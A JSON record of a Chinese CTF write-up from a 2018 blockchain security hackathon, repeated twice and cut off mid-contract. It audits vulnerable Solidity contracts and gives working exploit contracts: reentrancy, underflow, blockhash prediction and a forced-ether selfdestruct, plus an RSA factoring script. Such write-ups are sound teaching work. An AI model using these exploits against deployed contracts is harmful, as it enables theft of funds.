msg.sender);\n\t\t_;\n\t}\n\n\tmodifier isRunning {\n\t\tassert(block.number < cutOffBlockNumber);\n\t\t_;\n\t}\n\n\tmodifier isStop {\n\t\tassert(block.number >= cutOffBlockNumber);\n\t\t_;\n\t}\n\n\tconstructor(uint256 _cutOffBlockNumber) public {\n\t\towner = msg.sender;\t\t\t\n\t\tbalanceOf[owner] = 100000000000;\n        cutOffBlockNumber = _cutOffBlockNumber;\n\t}\n\n\tfunction transfer(address to, uint256 value) public returns (bool success) {\n    \trequire(balanceOf[msg.sender] >= value);\n    \trequire(balanceOf[to] + value >= balanceOf[to]);\n    \tbalanceOf[msg.sender] -= value;\n    \tbalanceOf[to] += value;\n    \treturn true;\n\t}\n\n\t// 下注并影响状态，该操作必须在赌局结束之前\n\tfunction bet(uint256 value, bool positive) isRunning public returns(bool success) {\n\t\trequire(balanceOf[msg.sender] >= value);\n\t\tbalanceOf[msg.sender] -= value;\n\t\tif (positive == true) {\n\t\t\tpositiveSet[msg.sender] += value;\n\t\t\tpositiveBalance += value;\n\t\t} else {\n\t\t\tnegativeSet[msg.sender] += value;\n\t\t\tnegativeBalance += value;\n\t\t}\n\t\t\n\t\tbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));\n\t\tuint8 flags = (uint8)(result & 0xFF);\t// 取一个字节，根据值的大小决定状态\n\t\tif (flags > 128) {\n\t\t\tstatus = 1;\n\t\t} else {\n\t\t\tstatus = 0;\n\t\t}\n\t\treturn true;\n\t}\n\n\t// 猜对就取回成本和猜对所得（猜错将不能取回成本），该操作必须在赌局结束以后\n\tfunction withdraw() isStop public returns (bool success){\n\t\tuint256 betBalance;\n\t\tuint256 reward;\n\t\tif (status == 1) { // positiveSet\n\t\t\tbetBalance = positiveSet[msg.sender];\n\t\t\tif (betBalance > 0) {\n\t\t\t    balanceOf[msg.sender] += betBalance;\n\t\t\t\tpositiveSet[msg.sender] -= betBalance;\n\t\t\t\tpositiveBalance -= betBalance;\n\t\t\t\treward = (betBalance * negativeBalance) / positiveBalance;\n\t\t\t\tnegativeBalance -= reward;\n\t\t\t\tbalanceOf[msg.sender] += reward;\n\t\t\t} \n\t\t} else if (status == 0) {\n\t\t\tbetBalance = negativeSet[msg.sender];\n\t\t\tif (betBalance > 0) {\n\t\t\t    balanceOf[msg.sender] += betBalance;\n\t\t\t\tnegativeSet[msg.sender] -= betBalance;\n\t\t\t\tnegativeBalance -= betBalance;\n\t\t\t\treward = (betBalance * positiveBalance) / negativeBalance;\n\t\t\t\tpositiveBalance -= reward;\n\t\t\t\tbalanceOf[msg.sender] += reward;\n\t\t\t}\n\t\t}\n\t\treturn true;\n\t}\n}\n```\n\n不按审合约正确的套路写了，这里给出我的答案，前三个是师傅的预期解。\n\n#### 随机数分布不均\n\n```\nif (flags > 128) {\n    status = 1;\n} else {\n    status = 0;\n}\n```\n正:反 = 129:127\n\n#### 发奖金时逻辑有误\n\n```\nnegativeSet[msg.sender] -= betBalance;\nnegativeBalance -= betBalance;\nreward = (betBalance * positiveBalance) / negativeBalance;\n```\n应该先计算reward，再变动参数，目前这样会导致用户多领款。\n\n#### 游戏时长设计不合理\n\n```\nmodifier isRunning {\n    assert(block.number < cutOffBlockNumber);\n    _;\n}\n\nmodifier isStop {\n    assert(block.number >= cutOffBlockNumber);\n    _;\n}\n\nconstructor(uint256 _cutOffBlockNumber) public {\n    owner = msg.sender;\t\t\t\n    balanceOf[owner] = 100000000000;\n    cutOffBlockNumber = _cutOffBlockNumber;\n}\n```\n我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：\n```\nrequire(游戏长度> 1000 and 游戏长度<10000);\ncutOffBlockNumber = block.number + 游戏长度;\n```\n\n#### 随机数的熵源\n\n虽然没有较完美的随机数生成方案，但这里有个大问题hh\n```\nbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));\n```\n区块未生成的情况下，`blockhash(block.number)`恒为0，借secbit的师傅的话：\n> 常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行 block.blockhash(block.number) 返回值为 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。\n\n#### 其他\n\n- solidity版本过低\n- 上个safemath库，不过这个合约上下溢处理的都ok\n\n### Q11 - 密码学RSA\n\n这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！\n\n明文:`something_for_nothing`\n\n思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。\n\n因为n1，n2高位相同，假设:\n- n1 = p1 \\* q1\n- n2 = (p1 + a) \\* (q1 + b)\n\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom gmpy2 import is_prime as prime\nfrom gmpy2 import iroot\nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L\nnn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L\n# print nn > n\nt = nn - n\n\ndef f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y\n\ndef f2(x, y, s): return (t - x * y - s) / (2 * x)\n\nfor x in xrange(366, 3000):\n    for y in xrange(1, 3000):\n        print x, y\n        if f1(x, y) >= 0:\n            s, b = iroot(f1(x, y), 2)\n            if b:\n                if prime(f2(x, y, int(s))):\n                    print \"Success\"\n                    print f2(x, y, int(s))\n                    exit()\n```\n\n之后RSA解密即可\n```\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, y, x = egcd(b % a, a)\n        return (g, x - (b // a) * y, y)\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    else:\n        return x % m\n\ndef bytes_to_num(b):\n    return int(b.encode('hex'), 16)\n\ndef num_to_bytes(n):\n    b = hex(n)[2:-1]\n    b = '0' + b if len(b)%2 == 1 else b #16进制补成偶数位\n    return b.decode('hex')\n\ndef gcd(a, b):\n    if a < b:\n        a, b = b, a\n    while b != 0:\n        temp = a % b\n        a = b\n        b = temp\n    return a\n\n\nn= 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L\nq = 153346707022470063255234682736500792074659843501367018551890586572000593877733769700626279692600930780783180304304442159621776245608196861201940418144595471936294352073422843950321344403965643436262621305985924339820909114418402737553700882775797335050564405239123363288904724634792579573240467129306394648627\np = 155294691991478076246533723107402680119846505071987471714029291163531622103148666018845728574257526241116901720654471382085147320775795052977889980257647661071362112907870430296641453839932096411043572129394525643559799347739002453989935199062302896371462733787830466546655020686256703190391276771066251117813\nc = 18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L \ne = 65537\nprint p*q == n\nd = modinv(e,(p-1)*(q-1))\nprint \"d: \" + str(d)\nm = pow(c,d,p*q)\nprint \"m: \" + str(m)\nflag = hex(m)\nprint str(flag)[2:-1].decode('hex')\n```\n\n\n### Q14 - puzzle Hello\n\n长亭的晓航师傅技术厉害，出的题好，人还帅，我们队已经全员被圈粉了orz。\n\n这是一道考察与合约交互的基础题。只给了函数声明和合约地址，通过反复交互，获得提示，最后拿到flag，不是很难。我没怎么记住具体过程，不过只要是做合约审计方向的，应该都可以做出来。\n\n我这留了个邮件的记录，大佬们可以参考一下交互方式，其实两个合约可以合并，当时打得有点意识模糊。。\n\n```\n随机数生成\npragma solidity ^0.4.19;\ncontract Attack {\n    address public owner;\n    address public victim;\n    uint256 public num;\n\n    function Attack() payable { owner = msg.sender;\n        victim = 0xc95872680072f57485aa0913ded224ee70a9e2cb;\n    }\n\n   \n    function sissel() public view returns(uint256)\n    {\n        uint256 seed = uint256(blockhash(block.number-1));\n        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n        return rand;\n    }\n}\n\n交互，可能少了几个步骤，大体是这样\ncontract xixi {\n   \n    address public owner;\n   \n    constructor()public{\n        owner = msg.sender;\n    }\n   \n    function getInfo() public pure returns(string);   \n    function sendFlag1() public returns(string);\n    function getCode() public pure returns(string);\n    function game(uint256 guess) public view returns(string);\n}\n```\n\n### Q15 - Puzzle Magic Bank\n\n还是晓航师傅出的题，超有趣，我很喜欢这样不是很难，但是考点很多，而且每一步都理所应当的题目。\n\n```\ncontract MagicBank {\n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public creditOf;\n    address owner;\n    \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    function transferBalance(address to, uint amount) public{\n        require(balanceOf[msg.sender] - amount >= 0);\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n    }\n    \n    event SendFlag(uint256 flagnum, string b64email);\n    function sendFlag3(string b64email) public {\n        require(balanceOf[msg.sender] >= 10000);\n        emit SendFlag(1, b64email);\n    }\n    \n    function guessRandom(uint256 guess) internal view returns(bool){\n        uint256 seed = uint256(blockhash(block.number-1));\n        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n        return rand == guess;\n    }\n    \n    function buyCredit(uint256 guess) public {\n        require(guessRandom(guess));\n        require(balanceOf[msg.sender] >= 10000);\n        require(creditOf[msg.sender] == 0);\n        \n        creditOf[msg.sender] = 1;\n        balanceOf[msg.sender] -= 10000;\n    }\n    \n    function withdrawCredit(uint amount) public{\n        require(creditOf[msg.sender] >= amount);\n        msg.sender.call.value(amount*1000000000)();\n        creditOf[msg.sender] -= amount;\n    }\n    \n    function sendFlag4(string b64email) public {\n        require(creditOf[msg.sender] >= 10000);\n        emit SendFlag(2, b64email);\n    }\n    \n    function getEthBalance() public view returns(uint256){\n        return this.balance;\n    }\n    \n    modifier onlyOwner(){\n        require(msg.sender == owner);\n        _;\n    }\n    function kill(address t) public onlyOwner {\n        selfdestruct(t);\n    }\n}\n```\n\n这题的流程是这样的：\n1. 首先随意`transferBalance()`一下，造成下溢，让balance很大，获得flag3\n2. 绕过随机数预测，成功调用`buyCredit()`，购买信用。\n3. `withdrawCredit()`中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。\n4. 上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。\n5. credit下溢后，获得flag4。\n\n攻击合约：\n```\ncontract magic_attack {\n    address owner;\n    string private email = \"OTA3ODg2MDc2QHFxLmNvbQ==\";\n    address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;\n    uint256 public rand = 0;\n   \n    constructor()public{\n        owner = msg.sender;\n        email = \"OTA3ODg2MDc2QHFxLmNvbQ==\";\n    }\n   \n    function step1() public{\n    \taddress my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;\n    \tuint256 amount = 0x186a0;\n    \tvictim.call(bytes4(keccak256(\"transferBalance(address,uint256)\")),my_to,amount);\n    }\n\n    function step2() public{\n        uint256 seed = uint256(blockhash(block.number-1));\n        rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n    \tvictim.call(bytes4(keccak256(\"buyCredit(uint256)\")),rand);\n    }\n    //在这里，另一个合约自毁。\n    function step3() public{\n    \tvictim.call(bytes4(keccak256(\"withdrawCredit(uint256)\")),1);\n    }\n\n    function () payable public{\n    \tvictim.call(bytes4(keccak256(\"withdrawCredit(uint256)\")),1);\n    }\n\n    function test() public{\n        MagicBank mb = MagicBank(victim);\n\t\tmb.sendFlag4(email);\n    }\n}\n\ncontract bomb {\n    address owner;\n    \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    function () payable public{}\n\n    function end() public{\n        selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);\n    }\n}\n```\n\n\n## 总结\n\n本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合和平日里老师的指导是息息相关的。\n\n让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。\n\n现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。\n\n就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。\n\n\n","source":"_posts/dorahack-blockchain.md","raw":"---\ntitle: 【writeup】DoraHacks 区块链安全Hackathon\ndate: 2018-10-15 13:48:32\ntags:\n- ctf\n- writeup\n- 天枢\n- 区块链\n- 智能合约\n---\n\n早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。\n\n本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！\n\n这里给出Q1、4、11、14、15 我们队的解答。\n\n<!-- more -->\n\n## 题目wp\n\n### Q1 - 测试题\n\n主办方提供了四个合约，需要我们给出漏洞点和修复方案，并按要求对某几个合约写出攻击合约。\n\n#### Auction.sol\n\n```\npragma solidity ^0.4.10;\n\ncontract Auction {\n    address public highestBidder;\n    uint256 public highestBid;\n\n    function Auction(uint256 _highestBid) {\n        require(_highestBid > 0);\n        // 设置起拍价格        \n        highestBid = _highestBid;\n        highestBidder = msg.sender;\n    }\n    \n    function bid() payable {\n        require(msg.value > highestBid);\n        // 退还上一位竞拍者资金\n        highestBidder.transfer(highestBid);\n\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n\n    }\n\n    // 根据区块高度或者时间等，结束拍卖\n    function auction_end() {\n        // ...\n    }\n}\n```\n\n很典型的King/拍卖合约，问题出在了出现下一个高价者时，上一个人退款时的transfer()。我们可以构造一个攻击合约，他的回调函数是payable，且函数中revert()或throw。即让我们的攻击合约，作为最高出价者，并且不能接受转账即可。\n\n#### BankOwned.sol\n\n```\ncontract Owned {\n    address public owner;\n    function Owned() { owner = msg.sender; }\n    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }\n}\n\ncontract Bank is Owned {\n    address public owner = msg.sender;\n    \n\n    function transferOwner(address new_owner) public onlyOwner payable {\n         owner = new_owner;\n    }\n\n    function withdraw(uint amount) public onlyOwner {\n        require(amount <= this.balance);\n        msg.sender.transfer(amount);\n    }\n}\n```\n\n这里我认为是继承了Owned()函数，出现了问题，solidity的继承原理是代码拷贝，所有人都可以调用Bank里的Owned函数，但我之后并未调通，希望大家指正这里。\n\n#### MyContacts.sol\n\n```\npragma solidity ^0.4.0;\n\ncontract MyContacts {\n\n        struct PersonInfo {\n            address person;\n            string phoneNumber;\n            string note;\n        }\n        \n        address private owner;\n        \n        mapping(address => PersonInfo) contacts;\n\n        function MyContacts() {\n            owner = msg.sender;\n        }\n\n        function addContact(address _person, string _phoneNumber, string _note) public {\n            PersonInfo info;\n            info.person = _person;\n            info.phoneNumber = _phoneNumber;\n            info.note = _note;\n            contacts[msg.sender] = info;\n        }\n}\n```\n\n在函数里声明，会覆盖变量。\n\n这里举个[启明的文章](https://paper.seebug.org/661/)，方便理解，师傅们在第一天的演讲中也提到了这一点。\n```\npragma solidity 0.4.24;\n\ncontract test {\n\n    struct aa{\n        uint x;\n        uint y;\n    }\n\n    uint public a = 4;\n    uint public b = 6;\n\n    function test1() returns (uint){\n        aa x;\n        x.x = 9;\n        x.y = 7;\n    }\n}\n```\n\n函数test1中定义了一个局部结构体变量x，但是没有对其进行初始化。根据solidity的变量存储规则，这时候x是存储在storage中的，而且是从索引0开始，那么对其成员变量x,y赋值之后，刚好覆盖了全局变量a和b。\n\n#### PrivateBank.sol\n\n```\npragma solidity ^0.4.15;\n\ncontract PrivateBank {\n    mapping (address => uint) userBalance;\n   \n    function getBalance(address u) constant returns(uint){\n        return userBalance[u];\n    }\n\n    function addToBalance() payable{\n        userBalance[msg.sender] += msg.value;\n    }   \n\n    function withdrawBalance(){\n        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n            throw;\n        }\n        userBalance[msg.sender] = 0;\n    }   \n}\n```\n\n看名字都猜出来了，肯定是重入漏洞啦\n```\nmsg.sender.call.value(userBalance[msg.sender])()\n```\n攻击的话call一下就好了hhh。\n\n```\n先让攻击合约充一点钱\nfunction () payable public{\n    victim.call(bytes4(keccak256(\"withdrawBalance()\")));\n}\n```\n\n### Q4 - 游戏逻辑题，找出三个漏洞\n\n这个题最后只有我们天枢给出了主办方满意的回答，已经在赛后分享和大家讨论过了。\n\n也是之前在创宇404的时候，和Lorexxar'师傅经常一起审合约，养成的好习惯。很喜欢这道题，出题的师傅说，请大家把它仅仅当作游戏合约来看待，而不是蜜罐之类的hh。我还蛮喜欢这种心态的。\n\n```\npragma solidity ^0.4.0;\n\n// Bet Game\ncontract BetGame {\n\taddress owner;\t\t\t\t\t                // 合约持有者\n\tmapping(address => uint256) public balanceOf;\t// 用户资金集\n\t\n\tuint256 public cutOffBlockNumber;\t\t        // 下注截止到cutOffBlockNumber,至少有1000个块的距离到创建合约的块\n\tuint256 public status; \t\t\t\t            // 状态，根据每次下注修改状态\n\tmapping(address => uint256) public positiveSet;\t// 赌注正面赢: status == 1\n\tmapping(address => uint256) public negativeSet;\t// 赌注反面赢: status == 0\n\tuint256 public positiveBalance;\t\t\t        // 正面下注资金总额\n\tuint256 public negativeBalance;\t\t\t        // 反面下注资金总额\n\n\tmodifier isOwner {\n\t\tassert(owner == msg.sender);\n\t\t_;\n\t}\n\n\tmodifier isRunning {\n\t\tassert(block.number < cutOffBlockNumber);\n\t\t_;\n\t}\n\n\tmodifier isStop {\n\t\tassert(block.number >= cutOffBlockNumber);\n\t\t_;\n\t}\n\n\tconstructor(uint256 _cutOffBlockNumber) public {\n\t\towner = msg.sender;\t\t\t\n\t\tbalanceOf[owner] = 100000000000;\n        cutOffBlockNumber = _cutOffBlockNumber;\n\t}\n\n\tfunction transfer(address to, uint256 value) public returns (bool success) {\n    \trequire(balanceOf[msg.sender] >= value);\n    \trequire(balanceOf[to] + value >= balanceOf[to]);\n    \tbalanceOf[msg.sender] -= value;\n    \tbalanceOf[to] += value;\n    \treturn true;\n\t}\n\n\t// 下注并影响状态，该操作必须在赌局结束之前\n\tfunction bet(uint256 value, bool positive) isRunning public returns(bool success) {\n\t\trequire(balanceOf[msg.sender] >= value);\n\t\tbalanceOf[msg.sender] -= value;\n\t\tif (positive == true) {\n\t\t\tpositiveSet[msg.sender] += value;\n\t\t\tpositiveBalance += value;\n\t\t} else {\n\t\t\tnegativeSet[msg.sender] += value;\n\t\t\tnegativeBalance += value;\n\t\t}\n\t\t\n\t\tbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));\n\t\tuint8 flags = (uint8)(result & 0xFF);\t// 取一个字节，根据值的大小决定状态\n\t\tif (flags > 128) {\n\t\t\tstatus = 1;\n\t\t} else {\n\t\t\tstatus = 0;\n\t\t}\n\t\treturn true;\n\t}\n\n\t// 猜对就取回成本和猜对所得（猜错将不能取回成本），该操作必须在赌局结束以后\n\tfunction withdraw() isStop public returns (bool success){\n\t\tuint256 betBalance;\n\t\tuint256 reward;\n\t\tif (status == 1) { // positiveSet\n\t\t\tbetBalance = positiveSet[msg.sender];\n\t\t\tif (betBalance > 0) {\n\t\t\t    balanceOf[msg.sender] += betBalance;\n\t\t\t\tpositiveSet[msg.sender] -= betBalance;\n\t\t\t\tpositiveBalance -= betBalance;\n\t\t\t\treward = (betBalance * negativeBalance) / positiveBalance;\n\t\t\t\tnegativeBalance -= reward;\n\t\t\t\tbalanceOf[msg.sender] += reward;\n\t\t\t} \n\t\t} else if (status == 0) {\n\t\t\tbetBalance = negativeSet[msg.sender];\n\t\t\tif (betBalance > 0) {\n\t\t\t    balanceOf[msg.sender] += betBalance;\n\t\t\t\tnegativeSet[msg.sender] -= betBalance;\n\t\t\t\tnegativeBalance -= betBalance;\n\t\t\t\treward = (betBalance * positiveBalance) / negativeBalance;\n\t\t\t\tpositiveBalance -= reward;\n\t\t\t\tbalanceOf[msg.sender] += reward;\n\t\t\t}\n\t\t}\n\t\treturn true;\n\t}\n}\n```\n\n不按审合约正确的套路写了，这里给出我的答案，前三个是师傅的预期解。\n\n#### 随机数分布不均\n\n```\nif (flags > 128) {\n    status = 1;\n} else {\n    status = 0;\n}\n```\n正:反 = 129:127\n\n#### 发奖金时逻辑有误\n\n```\nnegativeSet[msg.sender] -= betBalance;\nnegativeBalance -= betBalance;\nreward = (betBalance * positiveBalance) / negativeBalance;\n```\n应该先计算reward，再变动参数，目前这样会导致用户多领款。\n\n#### 游戏时长设计不合理\n\n```\nmodifier isRunning {\n    assert(block.number < cutOffBlockNumber);\n    _;\n}\n\nmodifier isStop {\n    assert(block.number >= cutOffBlockNumber);\n    _;\n}\n\nconstructor(uint256 _cutOffBlockNumber) public {\n    owner = msg.sender;\t\t\t\n    balanceOf[owner] = 100000000000;\n    cutOffBlockNumber = _cutOffBlockNumber;\n}\n```\n我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：\n```\nrequire(游戏长度> 1000 and 游戏长度<10000);\ncutOffBlockNumber = block.number + 游戏长度;\n```\n\n#### 随机数的熵源\n\n虽然没有较完美的随机数生成方案，但这里有个大问题hh\n```\nbytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));\n```\n区块未生成的情况下，`blockhash(block.number)`恒为0，借secbit的师傅的话：\n> 常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行 block.blockhash(block.number) 返回值为 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。\n\n#### 其他\n\n- solidity版本过低\n- 上个safemath库，不过这个合约上下溢处理的都ok\n\n### Q11 - 密码学RSA\n\n这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！\n\n明文:`something_for_nothing`\n\n思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。\n\n因为n1，n2高位相同，假设:\n- n1 = p1 \\* q1\n- n2 = (p1 + a) \\* (q1 + b)\n\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom gmpy2 import is_prime as prime\nfrom gmpy2 import iroot\nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L\nnn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L\n# print nn > n\nt = nn - n\n\ndef f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y\n\ndef f2(x, y, s): return (t - x * y - s) / (2 * x)\n\nfor x in xrange(366, 3000):\n    for y in xrange(1, 3000):\n        print x, y\n        if f1(x, y) >= 0:\n            s, b = iroot(f1(x, y), 2)\n            if b:\n                if prime(f2(x, y, int(s))):\n                    print \"Success\"\n                    print f2(x, y, int(s))\n                    exit()\n```\n\n之后RSA解密即可\n```\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, y, x = egcd(b % a, a)\n        return (g, x - (b // a) * y, y)\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    else:\n        return x % m\n\ndef bytes_to_num(b):\n    return int(b.encode('hex'), 16)\n\ndef num_to_bytes(n):\n    b = hex(n)[2:-1]\n    b = '0' + b if len(b)%2 == 1 else b #16进制补成偶数位\n    return b.decode('hex')\n\ndef gcd(a, b):\n    if a < b:\n        a, b = b, a\n    while b != 0:\n        temp = a % b\n        a = b\n        b = temp\n    return a\n\n\nn= 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L\nq = 153346707022470063255234682736500792074659843501367018551890586572000593877733769700626279692600930780783180304304442159621776245608196861201940418144595471936294352073422843950321344403965643436262621305985924339820909114418402737553700882775797335050564405239123363288904724634792579573240467129306394648627\np = 155294691991478076246533723107402680119846505071987471714029291163531622103148666018845728574257526241116901720654471382085147320775795052977889980257647661071362112907870430296641453839932096411043572129394525643559799347739002453989935199062302896371462733787830466546655020686256703190391276771066251117813\nc = 18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L \ne = 65537\nprint p*q == n\nd = modinv(e,(p-1)*(q-1))\nprint \"d: \" + str(d)\nm = pow(c,d,p*q)\nprint \"m: \" + str(m)\nflag = hex(m)\nprint str(flag)[2:-1].decode('hex')\n```\n\n\n### Q14 - puzzle Hello\n\n长亭的晓航师傅技术厉害，出的题好，人还帅，我们队已经全员被圈粉了orz。\n\n这是一道考察与合约交互的基础题。只给了函数声明和合约地址，通过反复交互，获得提示，最后拿到flag，不是很难。我没怎么记住具体过程，不过只要是做合约审计方向的，应该都可以做出来。\n\n我这留了个邮件的记录，大佬们可以参考一下交互方式，其实两个合约可以合并，当时打得有点意识模糊。。\n\n```\n随机数生成\npragma solidity ^0.4.19;\ncontract Attack {\n    address public owner;\n    address public victim;\n    uint256 public num;\n\n    function Attack() payable { owner = msg.sender;\n        victim = 0xc95872680072f57485aa0913ded224ee70a9e2cb;\n    }\n\n   \n    function sissel() public view returns(uint256)\n    {\n        uint256 seed = uint256(blockhash(block.number-1));\n        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;\n        return rand;\n    }\n}\n\n交互，可能少了几个步骤，大体是这样\ncontract xixi {\n   \n    address public owner;\n   \n    constructor()public{\n        owner = msg.sender;\n    }\n   \n    function getInfo() public pure returns(string);   \n    function sendFlag1() public returns(string);\n    function getCode() public pure returns(string);\n    function game(uint256 guess) public view returns(string);\n}\n```\n\n### Q15 - Puzzle Magic Bank\n\n还是晓航师傅出的题，超有趣，我很喜欢这样不是很难，但是考点很多，而且每一步都理所应当的题目。\n\n```\ncontract MagicBank {\n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public creditOf;\n    address owner;\n    \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    function transferBalance(address to, uint amount) public{\n        require(balanceOf[msg.sender] - amount >= 0);\n        balanceOf[msg.sender] -= amount;\n        balanceOf[to] += amount;\n    }\n    \n    event SendFlag(uint256 flagnum, string b64email);\n    function sendFlag3(string b64email) public {\n        require(balanceOf[msg.sender] >= 10000);\n        emit SendFlag(1, b64email);\n    }\n    \n    function guessRandom(uint256 guess) internal view returns(bool){\n        uint256 seed = 